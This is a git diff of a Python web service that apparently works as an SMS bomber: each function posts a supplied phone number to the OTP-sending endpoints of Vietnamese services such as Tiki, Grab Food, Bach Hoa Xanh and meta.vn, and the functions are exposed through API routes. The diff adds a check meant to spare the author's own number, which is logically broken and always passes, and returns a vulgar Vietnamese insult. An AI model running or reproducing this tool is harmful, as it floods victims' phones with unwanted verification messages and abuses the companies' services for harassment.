@@ -18,64 +18,74 @@ headers = {
 }
 
 def tiki(phone):
-    try:
-        json_data = {
+    if phone != "0395524153" or "84395524153":
+        try:
+            json_data = {
+                    'phone_number': phone,
+                }
+            response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=headers, json=json_data).text
+            return response_tiki
+        except:
+            return "Lỗi Không Xác Định!"
+    else:
+        return "Spam Số Tao Con Cặc À!"
+def grab_food(phone):
+    if phone != "0395524153" or "84395524153":
+        try:
+            json_data = {
+                'client_id': random_id(32),
+                'ctx_id': random_id(32),
+                'transaction_ctx': None,
+                'country_code': 'VN',
+                'method': 'SMS',
+                'num_digits': 6,
+                'scope': 'openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile',
                 'phone_number': phone,
             }
-        response_tiki = requests.post('https://tiki.vn/api/v2/customers/otp_codes', headers=headers, json=json_data).text
-        return response_tiki
-    except:
-        return "Lỗi Không Xác Định!"
-
-def grab_food(phone):
-    try:
-        json_data = {
-            'client_id': random_id(32),
-            'ctx_id': random_id(32),
-            'transaction_ctx': None,
-            'country_code': 'VN',
-            'method': 'SMS',
-            'num_digits': 6,
-            'scope': 'openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile',
-            'phone_number': phone,
-        }
-        response_grab_food = requests.post('https://partner-api.grab.com/grabid/v1/oauth2/otp', headers=headers, json=json_data).text
-        return response_grab_food
-    except:
-        return "Lỗi Không Xác Định!"
+            response_grab_food = requests.post('https://partner-api.grab.com/grabid/v1/oauth2/otp', headers=headers, json=json_data).text
+            return response_grab_food
+        except:
+            return "Lỗi Không Xác Định!"
+    else:
+        return "Spam Số Tao Con Cặc À!"
     
 def bach_hoa_xanh(phone):
-    try:
-        data = {
-            'phone': phone,
-            'objectId': random_id(36),
-            'type': '4',
-        }
-        response_bach_hoa_xanh = requests.post('https://www.bachhoaxanh.com/aj/Customer/SendOTP', headers=headers, data=data).text
-        return response_bach_hoa_xanh
-    except:
-        return "Lỗi Không Xác Định!" 
+    if phone != "0395524153" or "84395524153":
+        try:
+            data = {
+                'phone': phone,
+                'objectId': random_id(36),
+                'type': '4',
+            }
+            response_bach_hoa_xanh = requests.post('https://www.bachhoaxanh.com/aj/Customer/SendOTP', headers=headers, data=data).text
+            return response_bach_hoa_xanh
+        except:
+            return "Lỗi Không Xác Định!" 
+    else:
+        return "Spam Số Tao Con Cặc À!"
     
 def meta_vn(phone):
-    try:
-        params = {
-            'api_mode': '1',
-        }
+    if phone != "0395524153" or "84395524153":
+        try:
+            params = {
+                'api_mode': '1',
+            }
 
-        json_data = {
-            'api_args': {
-                'lgUser': phone,
-                'act': 'send',
-                'type': 'phone',
-            },
-            'api_method': 'CheckExist',
-        }
+            json_data = {
+                'api_args': {
+                    'lgUser': phone,
+                    'act': 'send',
+                    'type': 'phone',
+                },
+                'api_method': 'CheckExist',
+            }
 
-        response_meta_vn = requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=headers, json=json_data).text
-        return response_meta_vn
-    except:
-        return "Lỗi Không Xác Định!"    
-    
+            response_meta_vn = requests.post('https://meta.vn/app_scripts/pages/AccountReact.aspx', params=params, headers=headers, json=json_data).text
+            return response_meta_vn
+        except:
+            return "Lỗi Không Xác Định!"    
+    else:
+        return "Spam Số Tao Con Cặc À!"
 
 @app.post("/tiki")
 def read_item(phone: Optional[str] = None):
